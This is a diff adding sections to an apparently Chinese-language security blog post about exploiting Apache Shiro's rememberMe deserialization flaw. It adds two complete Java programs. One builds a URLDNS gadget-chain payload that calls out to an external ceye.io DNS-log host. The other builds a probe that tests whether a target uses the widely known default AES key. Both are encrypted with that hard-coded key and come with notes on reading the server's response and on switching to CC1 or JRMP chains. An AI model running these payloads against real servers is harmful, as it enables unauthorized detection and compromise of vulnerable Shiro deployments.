@@ -180,17 +180,191 @@
                 <img class="img-fluid" src="../img/2022-3-6/7.jpg">
               </a>
               
+
+              
+              <h2 class="section-heading">URLDNS探测</h2>
+              
+              <p>&nbsp;&nbsp;&nbsp;这里先用jdk原生URLDNS链写个payload。</p>
+              
+              <div>
+                
+<pre class='hljs'><code><span class="hljs-keyword">import</span> org.apache.shiro.codec.Base64;
+<span class="hljs-keyword">import</span> org.apache.shiro.crypto.AesCipherService;
+<span class="hljs-keyword">import</span> org.apache.shiro.io.SerializationException;
+<span class="hljs-keyword">import</span> org.apache.shiro.util.ByteSource;
+
+<span class="hljs-keyword">import</span> java.io.BufferedOutputStream;
+<span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;
+<span class="hljs-keyword">import</span> java.io.IOException;
+<span class="hljs-keyword">import</span> java.io.ObjectOutputStream;
+<span class="hljs-keyword">import</span> java.lang.reflect.Field;
+<span class="hljs-keyword">import</span> java.net.InetAddress;
+<span class="hljs-keyword">import</span> java.net.URL;
+<span class="hljs-keyword">import</span> java.net.URLConnection;
+<span class="hljs-keyword">import</span> java.net.URLStreamHandler;
+<span class="hljs-keyword">import</span> java.util.HashMap;
+
+
+<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EncryptPayload</span> </span>{
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">byte</span>[] serialize(Object o) <span class="hljs-keyword">throws</span> SerializationException {
+        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();
+        BufferedOutputStream bos = <span class="hljs-keyword">new</span> BufferedOutputStream(baos);
+        <span class="hljs-keyword">try</span> {
+            ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(bos);
+            oos.writeObject(o);
+            oos.close();
+            <span class="hljs-function"><span class="hljs-keyword">return</span> baos.<span class="hljs-title">toByteArray</span><span class="hljs-params">()</span></span>;
+        } <span class="hljs-keyword">catch</span> (IOException var6) {
+            String msg = <span class="hljs-string">"Unable to serialize object ["</span> + o + <span class="hljs-string">"].  "</span> + <span class="hljs-string">"In order for the DefaultSerializer to serialize this object, the ["</span> + o.getClass().getName() + <span class="hljs-string">"] "</span> + <span class="hljs-string">"class must implement java.io.Serializable."</span>;
+            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> SerializationException(msg, var6);
+        }
+    }
+
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">byte</span>[] encrypt_aes(Object o){
+        <span class="hljs-keyword">byte</span>[] bytes = <span class="hljs-keyword">this</span>.serialize(o);
+        <span class="hljs-keyword">byte</span>[] aes_key = Base64.decode(<span class="hljs-string">"kPH+bIxk5D2deZiIxcaaaA=="</span>);
+        AesCipherService aesCipherService = <span class="hljs-keyword">new</span> AesCipherService();
+        ByteSource bytesource = aesCipherService.encrypt(bytes,aes_key);
+        <span class="hljs-function"><span class="hljs-keyword">return</span> bytesource.<span class="hljs-title">getBytes</span><span class="hljs-params">()</span></span>;
+    }
+
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-function">String <span class="hljs-title">base64_encode</span><span class="hljs-params">(<span class="hljs-keyword">byte</span>[] bytes)</span></span>{
+        <span class="hljs-function"><span class="hljs-keyword">return</span> Base64.<span class="hljs-title">encodeToString</span><span class="hljs-params">(bytes)</span></span>;
+    }
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function">String <span class="hljs-title">encrypt</span><span class="hljs-params">(Object o)</span></span>{
+        <span class="hljs-keyword">byte</span>[] aes_encrypt = <span class="hljs-keyword">this</span>.encrypt_aes(o);
+        <span class="hljs-function"><span class="hljs-keyword">return</span> <span class="hljs-title">base64_encode</span><span class="hljs-params">(aes_encrypt)</span></span>;
+    }
+
+    <span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SilentURLStreamHandler</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">URLStreamHandler</span> </span>{
+        <span class="hljs-keyword">protected</span> <span class="hljs-function">URLConnection <span class="hljs-title">openConnection</span><span class="hljs-params">(URL u)</span> <span class="hljs-keyword">throws</span> IOException </span>{
+            <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;
+        }
+
+        <span class="hljs-keyword">protected</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-function">InetAddress <span class="hljs-title">getHostAddress</span><span class="hljs-params">(URL u)</span> </span>{
+            <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;
+        }
+    }
+
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>{
+        HashMap hashMap = <span class="hljs-keyword">new</span> HashMap();
+        URLStreamHandler <span class="hljs-keyword">handler</span> = <span class="hljs-keyword">new</span> SilentURLStreamHandler();
+        URL url = <span class="hljs-keyword">new</span> URL(<span class="hljs-keyword">null</span>, <span class="hljs-string">"http://171717.ceye.io"</span>, <span class="hljs-keyword">handler</span>);
+        Class clazz = Class.forName(<span class="hljs-string">"java.net.URL"</span>);
+        Field f = clazz.getDeclaredField(<span class="hljs-string">"hashCode"</span>);
+        f.setAccessible(<span class="hljs-keyword">true</span>);
+        hashMap.put(url,<span class="hljs-string">"123"</span>);
+        f.set(url,-<span class="hljs-number">1</span>);
+        String encrypt_data = <span class="hljs-keyword">new</span> EncryptPayload().encrypt(hashMap);
+        System.out.println(encrypt_data);
+    }
+}</code></pre>
+                
+              </div>
+                
+                
+              <h2 class="section-heading">AES密钥探测</h2>
+              
+              <p>&nbsp;&nbsp;&nbsp;但有时候目标依赖环境用URLDNS探测不了AES密钥是否正确，所以需要用另外一种方法探测AES密钥是否正确。
+              这种方法大概是利用序列化一个空的SimplePrincipalCollection类的payload来判断页面回显是否正确。由于该类继承自PrincipalCollection类，
+              所以不会像反序列化利用链一样返回rememberMe=deleteMe，而当密钥不正确时，会因为解密失败而返回rememberMe=deleteMe;。</p>
+              
+              
+              <div>
+              	
+              	<pre class='hljs'><code><span class="hljs-keyword">import</span> org.apache.shiro.codec.Base64;
+<span class="hljs-keyword">import</span> org.apache.shiro.crypto.AesCipherService;
+<span class="hljs-keyword">import</span> org.apache.shiro.io.SerializationException;
+<span class="hljs-keyword">import</span> org.apache.shiro.subject.SimplePrincipalCollection;
+<span class="hljs-keyword">import</span> org.apache.shiro.util.ByteSource;
+
+<span class="hljs-keyword">import</span> java.io.BufferedOutputStream;
+<span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;
+<span class="hljs-keyword">import</span> java.io.IOException;
+<span class="hljs-keyword">import</span> java.io.ObjectOutputStream;
+
+
+<span class="hljs-keyword">public</span> class ShiroKey {
+    <span class="hljs-keyword">public</span> <span class="hljs-built_in">byte</span>[] serialize(<span class="hljs-keyword">Object</span> o) <span class="hljs-keyword">throws</span> SerializationException {
+        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();
+        BufferedOutputStream bos = <span class="hljs-keyword">new</span> BufferedOutputStream(baos);
+        <span class="hljs-keyword">try</span> {
+            ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(bos);
+            oos.writeObject(o);
+            oos.close();
+            <span class="hljs-keyword">return</span> baos.toByteArray();
+        } <span class="hljs-keyword">catch</span> (IOException var6) {
+            <span class="hljs-keyword">String</span> msg = <span class="hljs-string">"Unable to serialize object ["</span> + o + <span class="hljs-string">"].  "</span> + <span class="hljs-string">"In order for the DefaultSerializer to serialize this object, the ["</span> + o.getClass().getName() + <span class="hljs-string">"] "</span> + <span class="hljs-string">"class must implement java.io.Serializable."</span>;
+            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> SerializationException(msg, var6);
+        }
+    }
+
+    <span class="hljs-keyword">public</span> <span class="hljs-built_in">byte</span>[] encrypt_aes(<span class="hljs-keyword">Object</span> o){
+        <span class="hljs-built_in">byte</span>[] bytes = <span class="hljs-keyword">this</span>.serialize(o);
+        <span class="hljs-built_in">byte</span>[] aes_key = org.apache.shiro.codec.Base64.decode(<span class="hljs-string">"kPH+bIxk5D2deZiIxcaaaA=="</span>);
+        AesCipherService aesCipherService = <span class="hljs-keyword">new</span> AesCipherService();
+        ByteSource bytesource = aesCipherService.encrypt(bytes,aes_key);
+        <span class="hljs-keyword">return</span> bytesource.getBytes();
+    }
+
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">String</span> base64_encode(<span class="hljs-built_in">byte</span>[] bytes){
+        <span class="hljs-keyword">return</span> Base64.encodeToString(bytes);
+    }
+
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">String</span> encrypt(<span class="hljs-keyword">Object</span> o){
+        <span class="hljs-built_in">byte</span>[] aes_encrypt = <span class="hljs-keyword">this</span>.encrypt_aes(o);
+        <span class="hljs-keyword">return</span> base64_encode(aes_encrypt);
+    }
+
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> main(<span class="hljs-keyword">String</span> []args) <span class="hljs-keyword">throws</span> Exception {
+        SimplePrincipalCollection simplePrincipalCollection = <span class="hljs-keyword">new</span> SimplePrincipalCollection();
+        <span class="hljs-keyword">String</span> encrypt_data = <span class="hljs-keyword">new</span> ShiroKey().encrypt(simplePrincipalCollection);
+        System.out.<span class="hljs-built_in">println</span>(encrypt_data);
+    }
+}</code></pre>
+              	
+              </div>
+              
+              
+              <h2 class="section-heading">AES密钥探测演示</h2>
+              
+              <p>&nbsp;&nbsp;&nbsp;key正确时页面无返回rememberMe=deleteMe;。</p>
+              
+              <a data-fancybox="gallery" href="../img/2022-3-6/9.jpg">
+                <img class="img-fluid" src="../img/2022-3-6/9.jpg">
+              </a>
+              
+              <p>&nbsp;&nbsp;&nbsp;key正确时页面返回rememberMe=deleteMe;。</p>
+              
+              <a data-fancybox="gallery" href="../img/2022-3-6/10.jpg">
+                <img class="img-fluid" src="../img/2022-3-6/10.jpg">
+              </a>
+              
+              
+              
+              
+              
+              
               <h2 class="section-heading">构造payload</h2>
               
-              <p>&nbsp;&nbsp;&nbsp;这里有个比较坑的地方，构造payload打过去发现报错了。搜了一下相关原因，似乎是因为Shiro resovleClass使用的是ClassLoader.loadClass方法而非Class.forName方法。</p>
+              <p>&nbsp;&nbsp;&nbsp;这里有个比较坑的地方，构造CC1链的payload打过去发现报错了。
+                搜了一下相关原因并检查了一下，发现shiro中ClassResolvingObjectInputStream类继承ObjectInputStream类，
+                并且resolveClass被重写，所以需要做一些修改。如果要用cc链的话，需要修改transformers数组(无法加载除Java本身自带的数组)。</p>
               
               
               <a data-fancybox="gallery" href="../img/2022-3-6/8.jpg">
                 <img class="img-fluid" src="../img/2022-3-6/8.jpg">
-              </a>
+              </a>  
               
-                
-                
+              
+              <p>&nbsp;&nbsp;&nbsp;或者直接用JRMP打</p>
+              
+              
+              <a data-fancybox="gallery" href="../img/2022-3-6/8.jpg">
+                <img class="img-fluid" src="../img/2022-3-6/8.jpg">
+              </a>  
+              
                 
                 
                 
